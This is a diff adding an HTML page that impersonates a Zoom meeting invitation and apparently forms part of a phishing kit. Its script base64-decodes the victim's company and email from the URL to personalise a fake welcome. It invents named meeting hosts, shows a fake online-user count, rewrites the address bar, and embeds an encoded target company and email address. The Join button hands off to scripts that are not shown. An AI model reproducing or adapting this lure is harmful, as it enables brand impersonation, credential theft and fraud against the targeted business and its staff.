@@ -1,0 +1,177 @@
+
+
+
+<!DOCTYPE html>
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./Zoom-Call-Group-Meeting_files/nav.css">
+    <link rel="stylesheet" href="./Zoom-Call-Group-Meeting_files/link.css">
+    <link rel="stylesheet" href="./Zoom-Call-Group-Meeting_files/meeting.css">
+    <link rel="shortcut icon" href="favicon2.ico" type="image/x-icon">
+    <script src="./Zoom-Call-Group-Meeting_files/jquery.3.7.0.js"></script>
+    <title>Zoom-Call-Group-Meeting</title>
+      <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const urlParams = new URLSearchParams(window.location.search);
+    var company = atob(`${urlParams.get('id')}`);
+    var emaill = atob(`${urlParams.get('access')}`);
+        // alert(company);
+    
+    if (company) {
+        document.querySelector(".meeting_header b").textContent = `${company}`;
+    } 
+    else {
+        document.querySelector(".meeting_header b").textContent = `${emaill}`;
+    }
+
+
+        const firstnm = `Mrs. A. Sunitha..`;//urlParams.get('firstname');
+        const secondnm = `Mr. Martin Sendoa..`; //urlParams.get('secondname');
+
+        const spans = document.querySelectorAll(".meeting_photo span");
+
+        $("#mailer").text(emaill);
+
+        if (firstnm && spans.length > 0) {
+            spans[0].textContent = firstnm;
+            spans[0].parentElement.style.textAlign = 'center';
+        }
+
+        if (secondnm && spans.length > 1) {
+            spans[1].textContent = secondnm;
+            spans[1].parentElement.style.textAlign = 'center';
+        }
+
+        // Centering the h5 elements
+        const h5Elements = document.querySelectorAll(".meeting_photo h5");
+        h5Elements.forEach(h5 => {
+            h5.style.textAlign = 'center';
+        });
+            const params = `id.php?meeting=video&id=${btoa(company)}&access=${btoa(emaill)}`;
+            const url = window.location.href;
+            
+            // Check if the URL already includes the specified parameters
+            if (!url.includes(params)) {
+                // Append the parameters to the URL
+                window.history.replaceState({}, '', `${url.split('?')[0]}?${params}`);
+            }
+
+            // Manipulate the URL bar to show the ending parts of the URL
+            const newUrl = window.location.pathname + window.location.search;
+            window.history.replaceState({}, '', newUrl);
+        });
+    </script>
+</head><body>
+    <main>
+        
+        <nav>
+        <div class="nav_top">
+        <span id="mobile_menu">☰</span>
+            <ul>
+                <li>
+                    <span>
+                    <span class="svg_container">
+                    <input type="search" name="" id="nav_iput" placeholder="Search">
+                    <img id="search_img" class="img_svg" src="./Zoom-Call-Group-Meeting_files/search.svg" alt="Search">
+                    </span>
+                    Search
+                    </span>
+
+                    <a href="#">support</a>
+                    <a href="#">1.888.799.9666</a>
+                    <a href="#"> Request a Demo</a>
+                </li>
+
+                <li>|</li>
+
+                <li>
+                <a href="#">Join</a>
+                <span id="host_container" class="svg_container">Host <img id="host_img" class="img_svg" src="./Zoom-Call-Group-Meeting_files/chevron-down.svg" alt="arrow down"></span>
+                <a href="#">Sign In</a>
+                </li>
+            </ul>
+        </div>
+
+        <div class="nav_down">
+            <ul>
+                <li>
+                    <span>
+                    <img id="zoom_img" src="./Zoom-Call-Group-Meeting_files/logo.svg" alt="Zoom">
+                    <a href="#">Products</a>
+                    <a href="#">Solutions</a>
+                    <a href="#">Resources</a>
+                    <a href="#">Plans &amp; Pricing</a>
+                    </span>
+
+                    <span>
+                        <a id="conact_btn" href="#">Contact Sales</a>
+                        <a id="sign_btn" href="#">Sign Up Free</a>
+                    </span>
+                </li>
+            </ul>
+        </div>
+        </nav>
+            
+    <section class="meeting_container">
+    <div class="meeting_contents">
+
+    <h1>Join Online Meeting</h1>
+
+    <div class="meeting_header">
+    Welcome, <b>HENAN TENDELI METALLURGICAL MATERIALS CO.,LTD</b>. You have been invited to join a meeting.
+    </div>
+
+    <div class="meeting_online">
+    2 Users Online <span id="online_icon"></span>
+    </div>
+    
+    <div class="meeting_photo">
+        <section>
+        <img src="./Zoom-Call-Group-Meeting_files/ceo.jpeg" alt="CEO">
+        <p>
+        <span>Mrs. A. Sunitha</span>
+        </p><h5>Freyr Solutions</h5><h5>
+		</p><h5>(C.E.O)</h5><h5>
+        <p></p>
+        </h5></section>
+
+        <section>
+        <img src="./Zoom-Call-Group-Meeting_files/manager.jpeg" alt="MANAGER">
+        <p>
+        <span>Mr. Martin Sendoa</span>
+		</p><h5>Freyr Solutions</h5><h5>
+        </p><h5>(Intl. Marketing Manager)</h5><h5>
+        <p></p>
+        </h5></section>
+    </div>
+
+    <div class="meeting_loading">
+      <span id="loader_img"></span>
+      <span id="loader_text"></span>
+    </div>
+
+    <input type="hidden" id="get_id" value="SEVOQU4gVEVOREVMSSBNRVRBTExVUkdJQ0FMIE1BVEVSSUFMUyBDTy4sTFRE"> 
+    <input type="hidden" id="get_access" value="c2FsZXMwMUBodG1tYWx1Zm9pbC5jb20=">
+
+    <button id="join_btn">Join</button>
+
+    <div class="meeting_note">
+    If you are unable to join the meeting, <a href="#" onclick="window.location.reload(true);">click here to <b>Refresh</b></a>.
+    </div>
+
+    </div>
+
+    </section>
+
+    <footer>
+    Copyright ©2025 Zoom Video Communication, Inc. All Rights Reserved.
+    </footer>
+    
+        <script src="./Zoom-Call-Group-Meeting_files/link.js"></script>
+        <script src="./Zoom-Call-Group-Meeting_files/meeting.js"></script>
+        <script src="./Zoom-Call-Group-Meeting_files/nav.js"></script>
+
+            </main>
+
+</body></html>
